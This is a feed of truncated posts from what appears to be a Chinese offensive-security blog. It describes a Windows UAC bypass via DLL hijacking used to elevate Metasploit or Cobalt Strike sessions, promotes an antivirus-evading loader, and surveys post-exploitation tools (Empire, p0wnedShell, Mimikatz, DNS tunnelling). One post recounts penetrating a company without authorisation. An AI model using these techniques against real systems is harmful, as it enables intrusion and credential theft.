这样就可以进行调试了。</description></item><item><title>Windows 2019 Bypass (UAC、Defender) to Metasploit</title><link>https://payloads.online/archivers/2019-01-26/1/</link><pubDate>Sat, 26 Jan 2019 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2019-01-26/1/</guid><description>0x00 前言 昨天下午在小密圈看到一篇文章：https://egre55.github.io/system-properties-uac-bypass/
文中指出 SystemPropertiesAdvanced.exe 有DLL劫持漏洞，经过分析，在Windows 10下无法复现
之前也做过关于DLL劫持、Bypass UAC的议题：DLL Hijacking &amp;amp; COM Hijacking ByPass UAC - 议题解读
在向下阅读前，请先掌握DLL劫持和Bypass UAC的基本知识。
微信交流群，加我微信：Guest_Killer_0nlis。
0x01 Cooolis Cooolis是我写的一个支持MSF与Cobaltstrike上线的加载器，能够100%绕过绝大部分杀软，包含国内90%以上、Windows Defender等。
之前发出了演示视频，在这里可以看到：Cobalt Strike - Metasploit Bypass AV
然后这个操作系统缺陷由于拥有自动权限提升的权限 autoElevate属性，我们可以利用它来执行Cooolis，使得Coolis上线的会话同样拥有管理员权限。
关于Bypass UAC的挖掘方法与原理，我的议题已经转化成了视频：
0x02 效果演示 Windows 2019中的C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe在运行时，会寻找srrstr.dll，这个DLL文件并不存在于：
C:\Windows\SysWOW64\srrstr.dll C:\Windows\System\srrstr.dll C:\Windows\srrstr.dll C:\Windows\SysWOW64\wbem\srrstr.dll C:\Windows\SysWOW64\WindowsPowershell\v1.0\srrstr.dll C:\Users&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\srrstr.dll 在最后它会寻找C:\Users\&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\这个目录，而这个目录的读写是不需要触发UAC获得管理员权限来操作的。
由此，可以利用该缺陷，将Coolis转换成DLL，上传至C:\Users\&amp;lt;Username&amp;gt;\APPData\Local\Microsoft\WindowsApps\，紧接着执行SystemPropertiesAdvanced.exe，它会自动将srrstr.dll加载至SystemPropertiesAdvanced.exe进程的内存，同样的，我们也就拥有了管理员权限。
在此之前，我有想过在下列模块里做一些优化：
exploit/windows/local/bypassuac_fodhelper exploit/windows/local/bypassuac_injection exploit/windows/local/bypassuac_comhijack 我觉得COM劫持的空间还是很大的，并且也一定程度上能够bypass AV。
Demo：
0x03 总结 UAC、DLL劫持、COM劫持的问题肯定还会有很多、但是以前的轮子到现在拿起来用基本上都会被行为拦截，这就需要掌握原理去自己探索、创造。
系统镜像：ed2k://|file|cn_windows_server_2019_x64_dvd_4de40f33.iso|5086887936|7DCDDD6B0C60A0D019B6A93D8F2B6D31|/</description></item><item><title>2018 - 挥手告别</title><link>https://payloads.online/archivers/2018-18-31/</link><pubDate>Mon, 31 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-18-31/</guid><description>2017 与创业这条路挥手告别 2017是我蜕变最大的一年，工作辞了、准备创业、创业失败，最终写了一篇文章，与创业这条路挥手告别。
文章部分内容如下：
《关于一叶知安团队，我有些事情要对读者交代》
朋友们，好久不见，这么久没有跟大家谈心了，我就说一说你们心里存在的疑问。
从2017年年初我就加入了一叶知安，负责线上的一些运营、代表作的开发（漏洞演练平台）以及担任Web安全扫盲公开课的讲师。
一开始是从知乎专栏做起来的，经常做一些安全研究，并且把自己的收获分享出去，第一部分是针对市面上一些软WAF的ByPass合集。
那段日子还是很充实的，虽说待业在家，但是一直在团队里面跟（云杰、Snake、GodKiller、……）都有约定，就是在今年的暑假成立一个公司，算是开始创业吧。
我们在一起产生了许多想法，包括如何打开市场，预估团队的价值和发展方向，还有如何提升关注热度。
我自主研发了Web漏洞演练平台，初衷是想给许多刚加入信安行业而选择Web安全领域的伙伴提供漏洞学习的方便，经过了一个月的Coding……最终做成了第一个版本，当然也存在诸多可以优化的地方和接口方面的扩展，睡觉之前都在思考如何做的更好。
开发期间是我一个人住在家里，一天不开口几次，很少和朋友出去聚一聚，每天的不规律作息，导致生病，自己去医院检查，拍了CT（颈椎变形了、问题不大，就是有时候下雨腰会疼，应该是某种关节炎吧），我以为这会是对病魔抵抗的战争提前吹响了号角，幸运的是只是一个可以用OTC解决的病，放下心后，花了几天调整身体。
于此同时也在学习技术，在小密圈和知乎专栏发布文章，和朋友们交流网络运营方面的技巧。
接着认识了很多目前经常联系的朋友，微信的联系人数从20多直线上升到目前的700多人，后来读者群的人数越来越多，需要把控广告、吹水、斗图的现象了，而我也每天都在群里与大家交流我的想法，把他们的反馈和建议写到我的备忘录中，以方便进行下一步的计划。
渐渐的快到了6月份，我开始感觉到一个人生活变得乏味，想多出去接触新鲜的面孔，更多的也是充满了对创业中收获的渴望。
我们团队的成员如愿以偿的见面了，首要任务是要解决一个注册公司的问题，还有办公场地，人员住宿等，这些问题夹杂在一起确实有点考验我们的耐心，时间一天一天的流逝，我们的计划也渐渐成熟，但是也将我们变得焦灼……
以上这些问题因为一些不可抗力的因素导致拖长，最终不得而散。
小密圈开始停更、知乎专栏开始停更、直至我退出了那个陪伴我不知道多少个日夜的读者群。
最终我还是没有离开那个地方，因为当时我不想就此停歇，我需要伙伴来与我并肩作战，怕就怕身后空无一人，但是时间太久了，我的积蓄也花的差不多达到我预期的数额了，然后我就决定开始做培训，将之前的个人开销赚回来。
培训是以一叶知安的名义做的，定下这个决定之前我有考虑过这么做的意义。
首先，如果以团队的名义去做，那就要一直对团队以及读者们负责，就要一直发展下去，将热度一直保持，反之，是徒劳的，一个团队在网络中，必须要持之以恒的坚持，保持最优秀的状态，最后。我们决定在以后还是会发展一叶知安，那么，在这里我给大家道个歉，一人之力难以帮助大家太久太久，我会把我自己掌握的、以及收获的都慢慢告诉大家。
写这篇文章的原因就是我今天打开了我们的专栏，看到我发布公告、技术文章的日期，发现时间过得真快，一晃而过，我已经在一家企业上班了，每天规律的作息、处理着工作中一些繁杂琐事，平凡的过着每一天。偶尔我也会写一写自己的心得和技术方面的进步收获。
目前团队原来的成员都很少联系（可能是因为尴尬），我们有过共同的目标，以此我感到荣幸和幸运，以往我是不在圈内活跃的，为了团队发展而展露自己的能力，这或许是安全圈内团队成长起来的必经之路。
感谢那些安全媒体在我们发布文章之后来询问是否授权转载，虽然我现在说话已经没有力度了，但是专栏是一直存在的，每一篇文章以及截图我们都有证明我们的努力，我们的每一个脚步。
目前我的培训已经完成三分之一了，在最后我还是会将视频发布给大家（当然要征得学员的统一意见），供大家学习，由于是第一次开培训，可能有些讲的不好，其中继承了不少之前讲Web扫盲公开课的方式（独创），这些技巧都是我从网上大把教程中总结出来的弊端，然后优化成自己的授课方式讲出来，在讲课中我锻炼了自己的表达能力，有时候会口吃，还好有朋友们指正，还记得讲SQL注入的时候，那堂分享课讲了大概两个小时四十分钟左右。
在以后的日子里，我会慢慢学习，低调发展，尽量把自己掌握的技术形成一个标准，录制成一套完整的安全教学视频，不为什么，只是想把一件事情做到最好。
刨除技术层面，算是一种广义的黑客精神吧
不知道大家现在过得怎么样了，我衷心祝福大家能每天开开心心的，乐观生活。感谢有你们的陪伴，成就了现在的我。
上次参加 DEFCON 0571 （杭州）沙龙，见了很多想见的朋友，渐渐的这是我第二次参加沙龙了，熟悉了这种技术氛围，认识了不少有想法的朋友，当然也有很多大佬~ 他们都很谦虚的，我们的交流方式除了线上，可能就是传统的面基了，哈哈，前两天还基了一个朋友，年纪不大，也在创业，仿佛他所想的都能与我产生某种共鸣，就好像某一天你看到一个人跟你一样在过去做过同样的事情。
这个公众号就当做我和大家交流的方式吧，并不想太目的的去写一些东西，感性趣就来看看。（若有错别字，将就看吧……）
2017/08/26 倾旋
&amp;gt;&amp;gt;原文
现在公众号已经废除、一叶知安已经解散，不会再去创作了，这篇文章意味着我接受了失败的结果，吸取教训，慢慢成长。
写上面这篇文章的时候是从南京落魄的逃离至杭州刚刚安定下来的时候，在此谢谢霖的照顾。
后续找了一份比较清闲的安全服务乙方工作，待遇还可以，但是团队是刚组建起来，需要很大精力投入建设，正是因为闲，我又把C/C++这类学习成本比较高的语言拾起来……至今我觉得我的选择是对的。
同时也给我的“前渗透框架”项目奠定了基础，锻炼了我的能力，使我在安全领域拥有了更多的方向。
参加沙龙的时候，有幸结识了我的前辈 - GUO，在聊到职业现状时，他建议我去更大的平台（奇虎/360企业安全集团），我非常认同前辈的说法——“人不能一直活在舒适区”。
当时只是简单聊聊，内心是对自己很不满意的，认为360是一个具有品牌力量的公司，能进入的绝非平庸之辈，我这样的可能面试都过不了，学历不高、能力不强，极度不自信。
正是这种极度不自信催促了我学习上进的心，然后开始将渗透做深，与ShadowTeam里的师傅们交流。
在2017年最后一次与GUO对话的时候，我说了一句：“我一定会自信的走进去（360）”
2018 过完年，杭州的天气依旧有些冷，决定做几个漂亮的渗透案例，到时候给自己的简历加分……
花了一个月的时间，产出了两篇文章：
针对国内一大厂的后渗透 - 持续 针对某跨国企业的一次渗透测试-持续 分别都拿到域控作为结束，我将文章脱敏后发出来，跨国企业的安全部负责人在安全圈看到了这个文章，通过邮箱取得联系，最后我决定删除文章，当时圈里都传遍了，朋友圈现在还有聊天记录。
的确这种做法是不对的，厂商也差点报警处理，还好没有太大影响，并且我也给了修复建议，碰到了好人，运气好。
三四月份，天气开始热起来了，我已经写好简历，按照流程面试完后，准备奔赴上海找房……
四月向魔都宣告 - 我来了 完成了一个梦想，真好，转眼间逝去的两年，我不断成长，感受人情冷暖、接纳新鲜事物，至今已学会如何照顾自己，让生活更具有色彩，人生更加无憾。
谢谢我的朋友们给我的支持！
&amp;gt;&amp;gt;原文
于是在八月份写了一篇总结：
入职 在炎热的四月底，我背着双肩包，顶着一头乱发来到上海，傍晚下了高铁，想到公司附近转转，赶上了团队的技术分享，晚上喝了很多酒，印象最深的还是那烧烤、啤酒、热情的人。
工作 慢慢的接触到了很多大牛，都很低调，从开始的渗透测试转向新型安全服务，偏向产品的路线，在接触产品的过程中也学到了不少；
有应急响应、代码审计、流量分析、渗透测试等，技术的广度提升了很多，也看到了技术变现有更多的可能，唯一就是我要不断的创新、发散自己的思维。
近况 最近没有规划近期目标，让我觉得有点小焦虑，很多东西都可以一步一步来的，准备养成一个写日记的习惯。</description></item><item><title>DLL Hijacking &amp; COM Hijacking ByPass UAC - 议题解读</title><link>https://payloads.online/archivers/2018-12-22/1/</link><pubDate>Sat, 22 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-22/1/</guid><description>在线地址：https://www.bilibili.com/video/av51718274/
0x00 前言 本文章只是方便阅读PPT，对于深入的去理解没有太大帮助，只是做个知识索引。
目录如下：
何为劫持 DLL是什么 DLL加载的过程 DLL劫持的原理 实现一个DLL劫持 - DLL Main 什么是COM 应用程序与COM注册表的关系 COM组件加载的过程 COM组件劫持的原理 实现一个COM组件劫持 UAC简介 ByPASS UAC的几种方式 ByPASS UAC原理 ByPASS UAC演示 挖掘ByPASS UAC的方法 PPT共享在文末的小密圈中了
0x01 何为劫持 即：“在正常事物发生之前进行一个旁路操作”
0x02 DLL是什么 DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。 在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。
在Windows平台下，我们使用的应用程序中的功能其实大多都很相似，窗口调用窗口的模块，分配内存调用内存管理的模块，文件操作调用IO模块，这些模块在Windows里的具体表现就是DLL文件。
0X03 DLL的加载过程 1.程序所在目录 2.程序加载目录（SetCurrentDirectory） 3.系统目录即 SYSTEM32 目录 4.16位系统目录即 SYSTEM 目录 5.Windows目录 6.PATH环境变量中列出的目录 PS：Windows操作系统通过“DLL路径搜索目录顺序”和“Know DLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。
注册表路径：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
DLL的加载过程 – Know DLLs注册表项 Know DLLs注册表项里的DLL列表在应用程序运行后就已经加入到了内核空间中，多个进程公用这些模块，必须具有非常高的权限才能修改。
DLL的加载过程 – Process Monitor Process Monitor是Windows的高级监视工具，可显示实时文件系统，注册表和进程/线程活动。
它结合了两个传统Sysinternals实用程序Filemon和Regmon的功能，并添加了大量增强功能，包括丰富和非破坏性过滤，全面的事件属性，如会话ID和用户名，可靠的流程信息，带有集成符号支持的完整线程堆栈 对于每个操作，同时记录到文件等等。 其独特的强大功能将使Process Monitor成为系统故障排除和恶意软件搜索工具包的核心实用程序。</description></item><item><title>Windows - 内存管理</title><link>https://payloads.online/archivers/2018-12-21/1/</link><pubDate>Fri, 21 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-21/1/</guid><description>0x00 Windows Heap 每个线程都有自己的堆栈，堆用于在内存中存储未知大小的数据，由堆管理器管理，而栈用于保存函数执行状态，存储局部变量。
0x01 申请堆空间的步骤 - Heap API HeapCreate // 创建堆句柄（内核对象） GetProcessHeap // 获取一个堆句柄 GetProcessHeaps // 获取所有堆句柄 HeapAlloc // 申请堆空间 HeapReAlloc // 在HeapAlloc的基础上申请一块堆空间 HeapFree // 释放堆空间 HeapDestory // 销毁堆句柄 0x02 HeapCreate Example 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 // ConsoleApplication2.</description></item><item><title>Windows - 线程同步</title><link>https://payloads.online/archivers/2018-12-20/Windows-CriticalSection/</link><pubDate>Thu, 20 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-20/Windows-CriticalSection/</guid><description>0x00 线程基础 每个线程的堆栈空间不同，在多线程执行时，可以互不干扰的运行，但是全局变量保存在全局区，当多个线程读写全局变量时，由于读写操作不是原子的，会发生程序错乱。
为什么不是原子？ 当自增、自减时，需要两行汇编指令，而CPU线程调度的最小单位是一行汇编指令，所以当某个值自增时，操作就不是原子的。
为了保证多线程读写全局变量达到同步，可以使用临界区技术，Windows正是实现了这个技术，提供了对应的API。
0x01 令牌线程同步 代码：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 // ConsoleApplication2.cpp : 定义控制台应用程序的入口点。 // #include &amp;#34;stdafx.h&amp;#34; #include &amp;lt;iostream&amp;gt; #include &amp;lt;Windows.h&amp;gt; DWORD num = 100; CRITICAL_SECTION cs; DWORD WINAPI ThreadPro1() { EnterCriticalSection(&amp;amp;cs); while (num &amp;gt; 0) { std::wcout &amp;lt;&amp;lt; &amp;#34;Thread num :&amp;#34; &amp;lt;&amp;lt; num &amp;lt;&amp;lt; &amp;#34; Thread ID :&amp;#34; &amp;lt;&amp;lt; GetCurrentThreadId() &amp;lt;&amp;lt; std::endl; num--; } LeaveCriticalSection(&amp;amp;cs); return 10; } DWORD WINAPI ThreadPro2() { EnterCriticalSection(&amp;amp;cs); while (num &amp;gt; 0) { std::wcout &amp;lt;&amp;lt; &amp;#34;Thread num :&amp;#34; &amp;lt;&amp;lt; num &amp;lt;&amp;lt; &amp;#34; Thread ID :&amp;#34; &amp;lt;&amp;lt; GetCurrentThreadId() &amp;lt;&amp;lt; std::endl; num--; } LeaveCriticalSection(&amp;amp;cs); return 10; } int _tmain() { HANDLE hThread[2]; InitializeCriticalSection(&amp;amp;cs); hThread[0] = CreateThread(NULL, 0,(PTHREAD_START_ROUTINE) ThreadPro1, NULL, 0, NULL); hThread[1] = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)ThreadPro2, NULL, 0, NULL); WaitForMultipleObjects(2, hThread, TRUE,INFINITE); std::wprintf(TEXT(&amp;#34;Success .</description></item><item><title>Windows 文件映射</title><link>https://payloads.online/archivers/2018-12-20/windows-FileMapping/</link><pubDate>Thu, 20 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-20/windows-FileMapping/</guid><description>0x00 文件映射的原理 文件映射(Mapping)是一种能够将文件内容映射到进程的虚拟地址空间的技术。视图(view)是一个由映射句柄开辟的一块虚拟地址空间，用于存放文件内容，当文件被映射完成后，改写视图虚拟地址空间的内容就相当于更改文件内容。
一般情况下，当代码运行完毕后，视图将会被自动写入文件中。
0x01 文件映射的步骤 CreateFile()&amp;hellip; CreateFileMapping()&amp;hellip; MapViewofFile()&amp;hellip; FlushViewofFile()&amp;hellip; 首先需要创建一个文件句柄，然后再创建一个文件映射的Mapping内核对象，通过映射获得视图。
0x02 文件映射简单代码 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // ConsoleApplication2.cpp : 定义控制台应用程序的入口点。 // #include &amp;#34;stdafx.h&amp;#34; #include &amp;lt;iostream&amp;gt; #include &amp;lt;Windows.h&amp;gt; int _tmain() { // 内存映射 // CreateFile()... // CreateFileMapping()... // MapViewofFile()... // FlushViewofFile... HANDLE hFile = CreateFile(TEXT(&amp;#34;C:\\Temp\\99.</description></item><item><title>最近学习Windows编程总结</title><link>https://payloads.online/archivers/2018-12-20/1/</link><pubDate>Thu, 20 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-20/1/</guid><description>0x00 Windows 字符编码 目前Windows最常见的字符集：
1.ASCII 2.Unicode 3.UTF-16 4.UTF-8 Unicode是一个字符集，UTF-16是Unicode的存储实现，Windows中的Unicode默认是UTF-16存储方式。
Unicode：
UTF-16：一个字符占用两个字节 UTF8-8：一个字符占用两个字节，一般用于网络传输 各个字符集的BOM头 UTF-8：EF BB BF UTF-16LE：FF FE UTF16BE：FE FF Windows字符数据类型 1 2 3 4 5 6 CHAR -&amp;gt; char PSTR -&amp;gt; char * WCHAR -&amp;gt; wchar_t PWSTR -&amp;gt; wchar_t * TCHAR -&amp;gt; 一个宏，当前是什么字符集，编译出来就是什么字符集 PTSTR -&amp;gt; TCHAR * (有利于跨平台) 开发中推荐使用“TEXT”宏与PTSTR类型的字符串指针。
0x01 Windows进程创建 进程是一个程序正在运行的一个实例，它由一个内核对象和一个地址空间组成。
内核对象与地址空间都在4GB的虚拟内存中，内核占2GB高地址，低地址的2GB给程序的堆栈使用。
在Windows中，系统通过句柄管理进程中的资源，句柄存储在内核空间中的一个全局句柄表中，而每个进程也都有一个句柄表，这个句柄表是私有的。
PID 是指的是全局句柄表的值。
进程执行的加载过程 1.映射EXE 2.创建内核对象EPROCESS 3.映射系统DLL（ntdll.dll） 4.创建线程内核对象ETHREAD 5.系统启动线程、映射DLL（ntdll.LdrInitalizeThunk）、线程开始执行 创建进程 1 2 3 4 5 6 7 8 9 10 11 12 13 BOOL CreateProcess ( LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATIONlpProcessInformation ); 线程与进程的关系 进程是一个程序正在运行的一个实例，它提供了一块存储代码的空间，在进程被创建时，系统也会给进程创建一个主线程（primary thread），主线程负责执行代码，一个进程没有线程是无法运行的。</description></item><item><title>Intranet Space - Linux Privilege</title><link>https://payloads.online/archivers/2018-12-19/linux-privilege/</link><pubDate>Wed, 19 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-19/linux-privilege/</guid><description>0x00 LinEnum Scripted Local Linux Enumeration &amp;amp; Privilege Escalation Checks
Github:https://github.com/rebootuser/LinEnum
Usage:https://github.com/rebootuser/LinEnum/blob/master/README.md
Example:$ ./ LinEnum.sh -s -k keyword -r report -e / tmp / -t
0x01 linux-exploit-suggester Often during the penetration test engagement the security analyst faces the problem of identifying privilege escalation attack vectors on tested Linux machine(s). One of viable attack vectors is using publicly known Linux exploit to gain root privileges on tested machine. Of course in order to do that the analyst needs to identify the right PoC exploit, make sure that his target is affected by the associated vulnerability and finally modify the exploit to suit his target.</description></item><item><title>Intranet Space - nishang &lt;ReadTeam/Powershell/Penetration-testing></title><link>https://payloads.online/archivers/2018-12-19/1/</link><pubDate>Wed, 19 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-19/1/</guid><description>0x00 Powershell ExecutionPolicy（执行策略） 设置执行策略(Set-ExecutionPolicy) Powershell默认的权限策略是：“Restricted”
查看当前执行策略：
1 2 PS C:&amp;gt; Get-ExecutionPolicy Restricted 查看所有执行策略：
1 2 3 4 5 6 7 8 PS E:&amp;gt; [System.Enum]::GetNames([Microsoft.PowerShell.ExecutionPolicy]) Unrestricted # 权限最高，可以不受限制执行任何脚本。 RemoteSigned # 本地脚本无限制，但是对来自网络的脚本必须经过签名 AllSigned # 所有脚本都必须经过签名才能在运行 Restricted # Powershell默认的策略，不允许任何脚本执行 Default # 为Powershell默认的策略 Bypass # 无任何限制策略，不警告、不提示 Undefined # 当前范围中没有设置执行策略 设置执行策略：
1 Set-ExecutionPolicy -ExecutionPolicy &amp;lt;PolicyName&amp;gt; 设置执行策略，并设置影响对象：
1 Set-ExecutionPolicy -ExecutionPolicy &amp;lt;PolicyName&amp;gt; -Scope &amp;lt;scope&amp;gt; 执行策略影响范围（Scope） 影响范围：Scope ，设置策略时选择影响对象。
1 2 3 4 5 6 7 8 PS C:&amp;gt;Get-ExecutionPolicy -List Scope ExecutionPolicy ----- --------------- MachinePolicy Undefined UserPolicy Undefined Process Undefined CurrentUser RemoteSigned LocalMachine AllSigned CurrentUser：执行策略仅影响当前用户。它存储在HKEY_CURRENT_USER注册表子项中。 Process ： 执行策略仅影响当前会话（当前的PowerShell进程）。 LOCALMACHINE ：执行策略会影响当前计算机上的所有用户。它存储在HKEY_LOCAL_MACHINE注册表子项中。 修改执行策略需要管理员权限</description></item><item><title>Intranet Space - Dns Tunneling</title><link>https://payloads.online/archivers/2018-12-18/6/</link><pubDate>Tue, 18 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-18/6/</guid><description>0x00 DNS隧道简介 DNS Tunneling，是隐蔽信道的一种，通过将其他协议的数据封装在DNS协议中传输建立通信。
普通的 DNS 查询过程如下:
客户端发送 DNS 请求-&amp;gt;DNS 服务器-&amp;gt;如果 DNS 服务器寻找不到该记录-&amp;gt;继续递归查询-&amp;gt;寻找该域名 的 NS 记录-&amp;gt;询问 NS 记录指向的 DNS 服务器-&amp;gt;DNS 服务器响应-&amp;gt;传输给客户端。
本次通过设置一个 NS 服务器，实现了 DNS 隧道的建立，使得服务器可向客户端发送任意命令，并且回 传命令执行的结果。 DNS 隧道是隐蔽的、可加密的数据传输隧道，基于 UDP 协议，目的端口号为 53。
它的缺点就是不稳定、 传输过大文件时容易失去连接，需要重新建立。
0x01 DNS隧道原理 DNS 隧道简单例子:
类型 主机记录 记录值 NS HACK NS.XXX.COM A NS XXX.XXX.XXX.XXX 首先在 DNS 解析管理平台上设置一个 NS 和一个 A 记录:
当我们询问 hello.HACK.XXX.COM 时，DNS 客户端发送的查询请求会递归到主机记录 NS 指向的 XXX.XXX.XXX.XXX 服务器上。 黑客通过在 XXX.XXX.XXX.XXX 服务器上监听 53 端口，即可获得 DNS 客户端发送来的请求。
0x02 如何获得命令执行结果?</description></item><item><title>Intranet Space - p0wnedShell</title><link>https://payloads.online/archivers/2018-12-18/2/</link><pubDate>Tue, 18 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-18/2/</guid><description>0x00 p0wnedShell p0wnedShell is an offensive PowerShell Runspace Post Exploitation host application written in C# that does not rely on powershell.exe but runs PowerShell commands and functions within a PowerShell run space environment (.NET). It has a lot of offensive PowerShell modules and binaries included making the process of Post Exploitation easier.
Github : https://github.com/Cn33liz/p0wnedShell
0x01 p0wnedShell 功能 PowerSploit Invoke-Shellcode PowerSploit Invoke-ReflectivePEInjection PowerSploit Invoke-Mimikatz PowerSploit Invoke-TokenManipulation PowerSploit PowerUp PowerSploit PowerView HarmJ0y’s Invoke-Psexec Besimorhino’s PowerCat Nishang Invoke-PsUACme Nishang Invoke-Encode Nishang Get-PassHashes Nishang Invoke-CredentialsPhish Nishang Port-Scan Nishang Copy-VSS Kevin Robertson Invoke-Inveigh Kevin Robertson Tater FuzzySecurity Invoke-MS16-032 0x02 编译 1 2 3 public static bool AutoMasq = true; public static string masqBinary = @&amp;#34;C:\Windows\Notepad.</description></item><item><title>Intranet Space - Empire</title><link>https://payloads.online/archivers/2018-12-18/1/</link><pubDate>Sat, 15 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-18/1/</guid><description>0x00 简介 Empire is a PowerShell and Python post-exploitation agent.
http://www.powershellempire.com/
0x01 安装 1 2 3 git clone https://github.com/EmpireProject/Empire cd Empire/setup.sh ./install.sh 0x02 模块介绍 Empire Module List agents creds plugins stager listeners module listeners listeners的功能是监听一个端口，通过该端口给客户端传递更多的命令和载荷。
agents agents主要是通过listeners获得的主机对象，可以通过list查看。
stager stager主要是用于生成初级载荷，也就是木马，在客户端执行后，客户端会主动连接listeners监听的端口，同时服务端的agents列表会出现客户端的主机信息。
module module的主要功能是通过给agents提供更多的功能，可通过searchmodule搜索。
plugins plugins主要用于调用和管理Empire的扩展。
creds creds是一个存储一些agents上获取到的凭证。
0x03 Simply use Empire 如何获得agents 1 ./empire # 启动empire 有285个module可以使用，1个listener在使用，0个agents。
1 2 3 4 5 6 7 8 9 10 11 (Empire) &amp;gt; listeners [*] Active listeners: Name Module Host Delay/Jitter KillDate ---- ------ ---- ------------ -------- Hello http http://192.</description></item><item><title>应急响应 近期总结</title><link>https://payloads.online/archivers/2018-12-06/1/</link><pubDate>Wed, 05 Dec 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-12-06/1/</guid><description>0x00 应急响应 简介：“应急响应”对应的英文是“Incident Response”或“Emergency Response”等，通常是指一个组织为了应对各种意外事件的发生所做的准备以及在事件发生后所采取的措施。 &amp;ndash; Baidu
0x01 应急响应类型 目前接触的那么多应急，基本上都是以下事件类型：
勒索病毒 挖矿木马 数据丢失 网页篡改 流量异常 &amp;hellip;. 0x02 应急响应的几个主要原因 资产脆弱业务对外 钓鱼邮件 服务器弱口令 内部工作人员作梗 &amp;hellip;&amp;hellip; 0x03 应急响应 - 勒索病毒 勒索病毒的特征：一般会加密敏感文件，并会将文件重命名，加密过程中还会横向移动，横向移动的手段包含但不限于：
服务器口令（RDP、SSH、SMB）爆破 SMB共享 WMIC 抓取密码横向 已知的RCE（Remote Code Execute）漏洞 &amp;hellip;. 同时可能会产生大量网络认证失败的日志，加密完成后还会清除自身或者清除操作系统日志。
非二进制方向的人处理方式基本上就是首先确定事件发生时间，其次根据操作系统日志排查病毒发作时间，缩小排查范围。
0x04 应急响应 - 挖矿木马 挖矿木马的特征：CPU、内存占用率很高，并且会连接一些IOC相关的域名或者于虚拟货币相关的域名来获取新的指令。
某些情况下，还会创建系统启动项，计划任务等。
一般情况下，这类情况都是未安装杀毒软件或杀毒软件病毒库太老。
横向移动的手段与0x03很相近。
IOC（Indicator of Compromise）入侵指标，目前可以理解为是一种威胁参考数据。
0x05 应急响应 - 数据丢失 这种是处理起来比较棘手的事件了，需要画大量的时间分析日志，确定数据丢失的方式。
首先需要网络日志和主机日志，从数据服务器反向跟踪：“我被谁访问，谁对我做了什么”
0x06 应急响应 - 网页篡改 分两种情况：
自动化批量攻击 定向入侵 首先需要保留HTTP服务器日志，第一种情况就要判断HTTP服务器上是否有脆弱的Web应用，例如：远程代码执行、文件上传漏洞。第二种情况就要从网页篡改后第一发现的时间作为开始日志审计工作的启动时间。
0x07 应急响应 - 流量异常 这种情况一般是服务器被僵尸网络木马控制了，要么就是UDP服务对外 —— DRDOS这类也有可能。</description></item><item><title>彻底理解Windows认证 - 议题解读</title><link>https://payloads.online/archivers/2018-11-30/1/</link><pubDate>Fri, 30 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-30/1/</guid><description>&lt;p>在内部分享的《彻底理解Windows认证》议题解读，本次议题围绕着Windows认证分别讲解了：&lt;/p>
&lt;ul>
&lt;li>Pass The Hash&lt;/li>
&lt;li>Silver Tickets、Golden Tickets、&lt;/li>
&lt;li>Impersonation Token&lt;/li>
&lt;/ul>
&lt;p>这些技术分别能够满足我们在渗透中持续的维持权限、提权。&lt;/p>
&lt;p>作者：倾旋&lt;/p></description></item><item><title>内网渗透心得</title><link>https://payloads.online/archivers/2018-11-26/1/</link><pubDate>Mon, 26 Nov 2018 00:00:00 +0000</pubDate><guid>https://payloads.online/archivers/2018-11-26/1/</guid><description>0x00 什么是内网渗透 通常是拿下某个内网访问权限后在内网中渗透？
0x01 为什么会出现内网渗透这个技术名词？ 因为在企业的网络建设里，有些数据资源需要保护起来，于是选择放在内网，这是一点，还有一点跟互联网地址空间、资金有关，于是NAT地址转换、端口转发技术应用的越来越多，形成了一个网关、N台服务器的形式，当某个对外服务被黑客入侵，那么黑客还会使用这个缺口继续深入，但是内网中的网络管理安全强度并没有外网那么严谨，导致Wannacry、震网等病毒统治内网，还有就是内网的服务、服务器大多采用默认配置，这并不是一个非常安全的方案，可并未重视起来。
